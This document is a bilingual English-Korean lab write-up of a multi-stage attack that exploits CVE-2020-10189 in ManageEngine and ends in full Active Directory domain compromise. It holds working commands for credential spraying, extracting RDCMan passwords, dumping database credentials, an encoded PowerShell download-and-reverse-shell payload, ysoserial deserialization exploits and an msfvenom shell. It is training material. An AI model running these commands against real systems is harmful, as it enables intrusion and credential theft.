About this lab

Explore a multi-stage network attack involving an enterprise environment vulnerable to CVE-2020-10189, an exploit for ManageEngine. Progress through system compromise via default credentials, leverage RCE to extract plaintext passwords, pivot using port forwarding, and escalate privileges by exploiting insecure GPO permissions. Your mission concludes with complete domain compromise.

이 연구실에 대하여

ManageEngine 취약점(CVE-2020-10189)에 취약한 기업 환경을 대상으로 하는 다단계 네트워크 공격을 살펴보세요. 기본 자격 증명을 이용한 시스템 침해부터 시작하여, 원격 코드 실행(RCE)을 통해 평문 암호를 추출하고, 포트 포워딩을 이용한 피벗 공격, 그리고 보안이 취약한 GPO 권한 악용을 통한 권한 상승까지 진행해야 합니다. 최종 목표는 도메인 전체를 침해하는 것입니다.

Lab Description
This hands-on lab guides learners through a realistic, multi-stage attack against an enterprise environment, starting with the exploitation of CVE-2020-10189, a known vulnerability in ManageEngine Desktop Central. Participants will identify and exploit a vulnerable service using default credentials and gain remote code execution (RCE) to establish a foothold. The attack continues with the extraction of plaintext credentials from RDCMan, pivoting deeper into the network through port forwarding, and exploiting insecure Group Policy Object (GPO) permissions to escalate privileges. The lab culminates in full domain compromise by achieving administrative control over the final target.
이 실습은 ManageEngine Desktop Central의 알려진 취약점인 CVE-2020-10189를 악용하는 것부터 시작하여 기업 환경에 대한 현실적인 다단계 공격을 안내합니다. 참가자는 기본 자격 증명을 사용하여 취약한 서비스를 식별하고 악용하여 원격 코드 실행(RCE) 권한을 획득하고 시스템에 접근합니다. 공격은 RDCMan에서 평문 자격 증명을 추출하고, 포트 포워딩을 통해 네트워크 깊숙이 침투하며, 안전하지 않은 그룹 정책 개체(GPO) 권한을 악용하여 권한을 상승시키는 단계로 이어집니다. 최종적으로는 대상에 대한 관리자 권한을 확보하여 도메인 전체를 장악하는 것으로 마무리됩니다.

Learning Objectives
## After completing this lab, learners will be able to:

- Perform enumeration to identify the vulnerable Manage Engine service.
- Exploit the Manage Engine RCE to gain a reverse shell and establish initial access.
- Locate cleartext credentials stored in RDCMan settings to access the next machine.
- Escalate privileges using identified vulnerabilities on subsequent boxes.
- Demonstrate full domain compromise by gaining administrative access to the final machine.
## 이 실습을 완료하면 학습자는 다음을 수행할 수 있게 됩니다.

- 취약한 관리 엔진 서비스를 식별하기 위해 열거 작업을 수행합니다.
- Manage Engine RCE 취약점을 악용하여 리버스 셸을 획득하고 초기 접근 권한을 확보하십시오.
- 다음 컴퓨터에 액세스하려면 RDCMan 설정에 저장된 평문 자격 증명을 찾으십시오.
- 후속 시스템에서 발견된 취약점을 이용하여 권한을 상승시키십시오.
- 최종 시스템에 관리자 권한을 획득하여 도메인 전체를 장악했음을 입증하십시오.


![[Pasted image 20251223135130.png]]



![[Pasted image 20251223135120.png]]



```bash
crackmapexec smb 192.168.197.95 -u 'Eric.Wallows' -p 'EricLikesRunning800' --shares
```

자격 증명이 네트워크 내의 어떤 시스템에서 통용되는지 확인
![[Pasted image 20251224145502.png]]


```bash
smbclient //192.168.197.95/C$ -U 'secura.yzx\Eric.Wallows%EricLikesRunning800'
```
![[Pasted image 20251224150608.png]]
파일 시스템 권한이 있다면 WMI를 통해 셸을 얻는 것
```bash
impacket-wmiexec 'secura.yzx/Eric.Wallows:EricLikesRunning800@192.168.197.95'
```
![[Pasted image 20251224150828.png]]

```cmd
#*.rdg 파일 찾는 명령어
dir /s /b C:\*.rdg
# ManageEngine 관련 서비스가 있는지 확인 tasklist /v | findstr /i "manage" 
# 8080, 8443 등 일반적인 관리 포트가 열려 있는지 확인 netstat -ano | findstr "LISTENING"
# 세팅 또는 파일 찾기
dir /s /b C:\Users\*.settings
dir /s /b C:\Users\RDCMan*
dir /s /b C:\Users\Administrator\*.rdg dir /s /b C:\Users\*.rdg
# 파일 내용에 특정단어 찾기
findstr /s /i /n /c:"찾을단어" *.*
```

RDCman 검색
```cmd
# 1. RDCMan 관련 설정 폴더 검색 (파일이 아닌 디렉토리 검색) dir /s /b /ad C:\Users\*"Remote Desktop Connection Manager"*
#세팅파일 확인
type "C:\Users\Administrator\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings"
```

확보한 XML 데이터에서 가장 핵심적인 정보
![[Pasted image 20251224153350.png]]

```cmd
# IP 주소 확인
nslookup era.secura.yzx
ping -n 1 era.secura.yzx
```

![[Pasted image 20251224153526.png]]


```bash
crackmapexec winrm 192.168.197.96 -u 'apache' -p 'New2Era4.!' -d .
```
로컬 계정 로그인 시도
![[Pasted image 20251224153943.png]]

```bash
evil-winrm -i 192.168.197.96 -u 'apache' -p 'New2Era4.!'
```
쉘 확보
![[Pasted image 20251224154259.png]]

```powershell
whoami /priv
net localgroup administrators
```
![[Pasted image 20251224154449.png]]

```powershell
# 1. ManageEngine 서비스가 돌아가고 있는지 확인
Get-Service | Where-Object {$_.DisplayName -like "*ManageEngine*" -or $_.Name -like "*ManageEngine*"}

# 2. 설치 경로 확인 (보통 C:\ 드라이브 아래)
Get-ChildItem -Path C:\ -Filter "ManageEngine" -Directory -Recurse -ErrorAction SilentlyContinue

# 3. 만약 서비스가 있다면 어떤 계정으로 돌아가는지 확인 (매우 중요)
Get-WmiObject win32_service | Where-Object {$_.Name -like "*ManageEngine*"} | Select-Object Name, StartName
```
![[Pasted image 20251224154857.png]]


![[Pasted image 20251224155054.png]]


```powershell
netstat -ano | findstr "LISTENING"
```
![[Pasted image 20251224155502.png]]

```bash
nmap -sV -p- --min-rate 5000 192.168.197.97 -oG 192.168.197.97.txt
```
![[Pasted image 20251224160625.png]]

```bash
nmap -sV -p- --min-rate 5000 192.168.197.95 -oG 192.168.197.95.txt
```
![[Pasted image 20251224161251.png]]




```bash
# 1. 변수에 명령어 저장
PAYLOAD='IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.219/powercat.ps1");powercat -c 192.168.45.219 -p 4444 -e powershell'

# 2. UTF-16LE로 변환 후 Base64 인코딩
echo -n "$PAYLOAD" | iconv -t utf-16le | base64 -w 0
```
![[Pasted image 20251224164216.png]]

```bash
java --add-opens java.base/java.lang=ALL-UNNAMED \ --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \ -jar ~/ysoserial.jar CommonsCollections1 \ "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA1AC4AMgAxADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAiACkAOwBwAG8AdwBlAHIAYwBhAHQAIAAtAGMAIAAxADkAMgAuADEANgA4AC4ANAA1AC4AMgAxADkAIAAtAHAAIAA0ADQANAA0ACAALQBlACAAcABvAHcAZQByAHMAaABlAGwAbAA=" \ > payload.bin
```
```bash
# -k: SSL 인증서 무시 (Self-signed인 경우가 많음)
# --data-binary: 바이너리 파일 그대로 전송 (매우 중요)
curl -X POST -k "https://192.168.197.95:8443/vulnerabilities/UploadServlet" --data-binary @payload.bin
```
![[Pasted image 20251224164823.png]]


```bash
java --add-opens java.base/java.lang=ALL-UNNAMED \
     --add-opens java.base/java.util=ALL-UNNAMED \
     --add-opens java.base/java.lang.reflect=ALL-UNNAMED \
     --add-opens java.base/java.text=ALL-UNNAMED \
     --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
     -jar ~/ysoserial.jar CommonsCollections6 \
     "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA1AC4AMgAxADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAiACkAOwBwAG8AdwBlAHIAYwBhAHQAIAAtAGMAIAAxADkAMgAuADEANgA4AC4ANAA1AC4AMgAxADkAIAAtAHAAIAA0ADQANAA0ACAALQBlACAAcABvAHcAZQByAHMAaABlAGwAbAA=" \
     > payload.bin
```


```powershell
# ManageEngine AppManager의 웹 설정 파일(web.xml)에서 'UploadServlet' 검색
Get-ChildItem -Path "C:\Program Files\ManageEngine\AppManager14" -Filter "web.xml" -Recurse | Select-String "UploadServlet" -Context 0,5
```


```bash
evil-winrm -i 192.168.243.95 -u 'Eric.Wallows' -p 'EricLikesRunning800'
```
![[Pasted image 20251229145439.png]]


![[Pasted image 20251229145456.png]]

```bash
evil-winrm -i 192.168.243.96 -u 'apache' -p 'New2Era4.!'
C:\Users\apache.ERA\Documents> c:\xampp\mysql\bin\mysqldump.exe -u root --all-databases >db.sql
```
![[Pasted image 20251229152901.png]]
type db.sql
![[Pasted image 20251229152957.png]]
```sql
INSERT INTO `creds` VALUES ('administrator','Almost4There8.?'),('charlotte','Game2On4.!');
```
![[Pasted image 20251229154504.png]]

```bash
evil-winrm -i 192.168.243.97 -u 'charlotte' -p 'Game2On4.!'
```


![[Pasted image 20251229155456.png]]

whoami /priv

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.244 LPORT=4444 -f exe -o sh.exe
```


![[Pasted image 20251229161350.png]]

![[Pasted image 20251229161451.png]]

![[Pasted image 20251229161627.png]]




